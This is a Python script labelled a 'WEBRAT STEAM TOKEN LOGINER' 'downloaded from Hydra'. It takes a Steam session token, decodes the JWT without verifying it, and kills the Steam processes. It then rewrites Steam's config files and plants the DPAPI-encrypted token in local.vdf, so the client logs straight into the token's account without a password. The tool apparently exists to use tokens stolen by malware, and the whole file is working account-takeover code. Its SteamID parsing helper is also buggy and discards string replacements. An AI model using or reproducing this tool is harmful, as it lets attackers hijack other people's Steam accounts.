import pathlib
import vdf
import os
import time
import sys
import jwt
import re
import win32crypt
import binascii
import zlib

class InvalidSteamID(Exception):

    def __init__(self, *args, **kwargs):
        Exception.__init__(self, 'The given steam id is not valid.')

class SteamID:
    x: int = None
    y: int = None
    z: int = None

    def __init__(self, any_steamid: str):
        """
        Insert any kind of steam id as a string in the init method
        :param any_steamid: One of the differnt kinds of steamids as string
        """
        self.convert(any_steamid)

    def get_steam64_id(self):
        return int(self.get_steam32_id() + 76561197960265728)

    def get_steam32_id(self):
        return int(2 * int(self.z) + int(self.y))

    def get_steam_id3(self):
        return f'U:{self.y}:{self.get_steam32_id()}'

    def get_steam_id(self):
        return f'STEAM_{self.x}:{self.y}:{self.z}'

    def convert(self, any_steamid: str):
        """
        This method will convert the class variables to the different kinds
        of steam ids, based on the paramerter.
        :param any_steamid: One of the differnt kinds of steamids as string
        """
        any_steamid = any_steamid.lower()
        any_steamid = any_steamid.replace(' ', '')
        try:
            steamid = int(any_steamid)
            if len(bin(steamid)) >= 32:
                steam32_id = steamid - 76561197960265728
                self.x = 0
                self.y = 0 if steam32_id % 2 == 0 else 1
                self.z = int((steam32_id - self.y) / 2)
            if len(bin(steamid)) < 32:
                steam32_id = steamid
                self.x = 0
                self.y = 0 if steam32_id % 2 == 0 else 1
                self.z = int((steam32_id - self.y) / 2)
        except ValueError:
            if any_steamid.startswith('steam_'):
                any_steamid.replace('steam_', '')
                steamid_parts = any_steamid.split(':')
                self.x = steamid_parts[0]
                self.y = steamid_parts[1]
                self.z = steamid_parts[2]
                self.steam32_id = 2 * self.z + self.y
            if any_steamid.startswith('['):
                any_steamid.replace('[', '')
                any_steamid.replace(']', '')
                any_steamid.replace('u:', '')
                steamid_parts = any_steamid.split(':')
                self.x = 0
                self.y = steamid_parts[0]
                self.z = int((steamid_parts[1] - self.y) / 2)
            if any_steamid.startswith('u'):
                any_steamid.replace('u:', '')
                steamid_parts = any_steamid.split(':')
                self.x = 0
                self.y = steamid_parts[0]
                self.z = int((steamid_parts[1] - self.y) / 2)
        except Exception:
            raise InvalidSteamID
        if self.x is None or self.y is None or self.z is None:
            raise InvalidSteamID
os.system('title WEBRAT STEAM TOKEN LOGINER | DOWNLOADED FROM HYDRA')
print('WEBR.AT STEAM TOKEN LOGINER | DOWNLOADED FROM HYDRA')

def validate_token(token):
    if token.count('.') == 3:
        return True
    print('You entered a bad token!!!')
    return False
token = input('Enter token:\n')
if validate_token(token):
    print('')
else:
    input('')
    exit()
file_path = 'C:\\Program Files (x86)\\Steam\\steam.exe'
if os.path.exists(file_path):
    print('Steam found!')
    steamdir = 'C:\\Program Files (x86)\\Steam'
else:
    steamdir = input('Enter steam path ( example: C:\\Program Files (x86)\\Steam ):\n')
if not steamdir.endswith('\\'):
    steamdir += '\\'
os.system('taskkill /f /im Steam.exe')
os.system('taskkill /f /im steamwebhelper.exe')
os.system('taskkill /f /im steamservice.exe')
os.system('taskkill /f /im Steam.exe')
os.system('taskkill /f /im steamwebhelper.exe')
os.system('taskkill /f /im steamservice.exe')
login = token[:token.find('.')]
token = token[token.find('.') + 1:]
steamid = jwt.decode(token, options={'verify_signature': False})['sub']
udir = f'{steamdir}userdata\\{SteamID(steamid).get_steam32_id()}\\config'
pathlib.Path(udir).mkdir(parents=True, exist_ok=True)
with open(f'{udir}\\localconfig.vdf', 'w', encoding='utf8', errors='ignore') as f:
    f.write('"UserLocalConfigStore"\n    {\n        "streaming_v2"\n        {\n            "EnableStreaming"       "0"\n        }\n        "friends"\n        {\n            "SignIntoFriends"\t\t"0"\n        }\n    }\n    ')
pathlib.Path(f'{steamdir}\\config').mkdir(parents=True, exist_ok=True)
with open(f'{steamdir}\\config\\config.vdf', 'w', encoding='utf8', errors='ignore') as f:
    f.write('"InstallConfigStore"\n    {\n        "Software"\n        {\n            "Valve"\n            {\n                "Steam"\n                {\n                    "Accounts"\n                    {\n                        "' + login + '"\n                        {\n                            "SteamID"\t\t"' + steamid + '"\n                        }\n                    }\n                }\n            }\n        }\n    }\n    ')
with open(f'{steamdir}\\config\\loginusers.vdf', 'w', encoding='utf8', errors='ignore') as f:
    f.write('"users"\n    {\n        "' + steamid + '"\n        {\n            "AccountName"\t\t"' + login + '"\n            "PersonaName"\t\t"' + login + '"\n            "RememberPassword"\t\t"1"\n            "WantsOfflineMode"\t\t"0"\n            "SkipOfflineModeWarning"\t\t"0"\n            "AllowAutoLogin"\t\t"0"\n            "MostRecent"\t\t"1"\n            "Timestamp"\t\t"' + str(round(time.time())) + '"\n        }\n    }\n    ')
localst = os.getenv('LOCALAPPDATA') + '\\steam'
pathlib.Path(localst).mkdir(parents=True, exist_ok=True)
pwdHash = win32crypt.CryptProtectData(token.encode(), None, login.encode(), None, None, 0)
pw = str(binascii.hexlify(pwdHash), encoding='ascii')
print('"' + login + '"')
hdr = hex(zlib.crc32(login.encode()) & 4294967295).replace('0x', '') + '1'
with open(f'{localst}\\local.vdf', 'w', encoding='utf8', errors='ignore') as f:
    f.write('"MachineUserConfigStore"\n    {\n        "Software"\n        {\n            "Valve"\n            {\n                "Steam"\n                {\n                    "ConnectCache"\n                    {\n                        "' + hdr + '"\t\t"' + pw + '"\n                    }\n                }\n            }\n        }\n    }\n    ')
os.system('start steam://0')